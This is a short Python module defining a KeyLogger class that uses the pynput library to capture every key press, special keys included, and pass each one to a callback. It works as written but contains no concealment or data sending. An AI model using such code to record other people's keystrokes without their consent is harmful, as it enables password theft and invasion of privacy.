from pynput.keyboard import Listener

class KeyLogger:
    def __init__(self, log_callback):
        self.log_callback = log_callback

    def on_press(self, key):
        try:
            self.log_callback(str(key.char))
        except AttributeError:
            self.log_callback(f'Special key {str(key)} pressed')

    def start(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()
